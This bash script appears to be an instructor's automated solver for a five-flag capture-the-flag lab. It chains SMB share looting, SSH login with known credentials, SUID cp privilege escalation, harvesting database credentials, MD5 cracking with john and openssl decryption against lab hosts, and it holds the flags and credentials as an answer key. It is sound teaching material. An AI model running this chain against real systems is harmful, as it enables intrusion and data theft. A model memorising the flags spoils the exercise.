#!/bin/bash
# Alt Final 2026 — automated solver / verifier.
# Run INSIDE altfinal2026-attacker (as root):
#     docker exec -i altfinal2026-attacker bash -s < solve.sh
# Walks the intended path for all five flags and reports pass/fail.
# Instructor sanity-check only; not given to students.

set -u
WEB=10.10.13.10; SMB=10.10.13.11; SSH=10.10.13.12; DB=10.10.13.13
DBUSER=vhealth_app; DBPASS='V@nta_db#2026'
SSHUSER=rkhan; SSHPW='August2026'
# -n keeps ssh from swallowing this script when it is fed on stdin.
SSHOPT="-n -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o ConnectTimeout=8"
PASS=0; FAIL=0
check(){ if printf '%s' "$2" | grep -q "$1"; then echo "  [PASS] $1"; PASS=$((PASS+1)); else echo "  [FAIL] missing $1"; FAIL=$((FAIL+1)); fi; }

command -v sshpass >/dev/null 2>&1 || { echo "[*] installing sshpass..."; apt-get update -qq >/dev/null 2>&1; apt-get install -y -q sshpass >/dev/null 2>&1; }

echo "== F1: web recon =="
check 'flag{altfinal2026_web_recon}' "$(curl -s http://$WEB/)"

echo "== F2: anonymous SMB share =="
rm -f /tmp/pol.txt
smbclient "//$SMB/hr" -N -c 'get IT_onboarding_policy.txt /tmp/pol.txt' >/dev/null 2>&1
check 'flag{altfinal2026_smb_share}' "$(cat /tmp/pol.txt 2>/dev/null)"

echo "== F3: targeted SSH brute force (rkhan:August2026) =="
F3=$(sshpass -p "$SSHPW" ssh $SSHOPT "$SSHUSER@$SSH" 'cat ~/user.txt' 2>/dev/null)
check 'flag{altfinal2026_ssh_foothold}' "$F3"

echo "== F4: SUID /bin/cp -> read root-only flag =="
# SUID cp preserves the source's 600/root mode on a normal copy, so read the
# file by having cp write straight to stdout (GTFOBins technique).
F4=$(sshpass -p "$SSHPW" ssh $SSHOPT "$SSHUSER@$SSH" 'cp /root/root.txt /dev/stdout' 2>/dev/null)
check 'flag{altfinal2026_root_privesc}' "$F4"

echo "== F5: cred reuse -> crack MD5 -> openssl decrypt =="
CREDS=$(sshpass -p "$SSHPW" ssh $SSHOPT "$SSHUSER@$SSH" 'cat /opt/scripts/db_backup.sh' 2>/dev/null)
printf '%s' "$CREDS" | grep -q "$DBUSER" && echo "  [ok] DB creds found in db_backup.sh"
# Kali's MariaDB client defaults to requiring TLS; this server has none -> --ssl=0
HASHVAL=$(mysql --ssl=0 -h "$DB" -u "$DBUSER" -p"$DBPASS" vanta_db -N -B -e 'SELECT secret_hash FROM vault LIMIT 1;' 2>/dev/null)
echo "  db hash: ${HASHVAL:-<none>}"
echo "$HASHVAL" > /tmp/h.txt
rm -f /tmp/altfinal.pot
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --pot=/tmp/altfinal.pot /tmp/h.txt >/dev/null 2>&1
KEY=$(john --show --format=raw-md5 --pot=/tmp/altfinal.pot /tmp/h.txt 2>/dev/null | head -1 | cut -d: -f2)
echo "  cracked key: ${KEY:-<none>}"
sshpass -p "$SSHPW" ssh $SSHOPT "$SSHUSER@$SSH" 'cat /opt/vault/patient_export.enc' > /tmp/vault.enc 2>/dev/null
F5=$(openssl enc -aes-256-cbc -d -salt -in /tmp/vault.enc -k "$KEY" 2>/dev/null)
check 'flag{altfinal2026_crack_decrypt}' "$F5"

echo
echo "RESULT: $PASS passed, $FAIL failed"
if [ "$FAIL" -eq 0 ]; then echo "ALL FIVE FLAGS REACHABLE"; exit 0; else echo "SOME FLAGS UNREACHABLE — ensure the stack is fully up (~60s after 'up -d')"; exit 1; fi
